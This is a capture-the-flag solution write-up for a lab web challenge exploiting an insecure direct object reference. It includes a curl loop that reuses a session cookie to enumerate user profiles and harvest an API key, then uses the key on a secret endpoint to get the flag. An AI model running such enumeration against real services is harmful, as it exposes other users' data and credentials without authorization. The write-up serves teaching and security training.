# Solution

The intended solution exploits the "broken access control" topic from [OWASP's top 10](https://owasp.org/www-project-top-ten/) list of 2021.
More specifically, using an insecure direct object references ("IDOR").

## Steps:

**1.** Log in as Signy using the provided credentials

**2.** Navigate to Signy's profile page with the "User profile" link

**3.** Notice the `userId=5` part of the URL, and change it to `userId=6` to verify the IDOR vulnerability

**4.** Grab your `authToken` cookie from the web browser to prepare for automation

**4.** Enumerate the user profiles to find a non-corrupted user

This can for example be done using cURL with a command line script, including the `authToken` cookie and the specified URL.

```shell
cookie="authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjUsImlhdCI6MTY0NzQyMTAzM30.opV7gK9l2_MpsLBlXhQzZWC1vitPE7dEVClHNGKJDgk"
for i in `seq 1 100`; do
  echo "Trying userId=$i";
  curl -s -H "cookie: $cookie" "https://b-urglar-ctf.labs.nais.io/profile?userId=$i" | grep -i "<code>" | grep -v "Error loading user";
done
```

Running this will iterate over the first 100 users, printing out the API key for all non-corrupted users:
```
…
Trying userId=73
Trying userId=74
Trying userId=75
Trying userId=76
Trying userId=77
Trying userId=78
Trying userId=79
    <code>c3VwZXJzZWNyZXRhcGlrZXl0aGF0eW91d2lsbG5ldmVyZ3Vlc3MK</code>
```

**5.** Use the API token to call the secret endpoint

This can again be done using cURL, but any http client with header-support should work.

```shell
token="c3VwZXJzZWNyZXRhcGlrZXl0aGF0eW91d2lsbG5ldmVyZ3Vlc3MK"
curl -s -H "authorization: $token" "https://b-urglar-ctf.labs.nais.io/secret"
```

The JSON-response contains the flag 🎉
```json
{"flag":"HSCTF{Brad1337IsTooCoolForSchool}"}
```
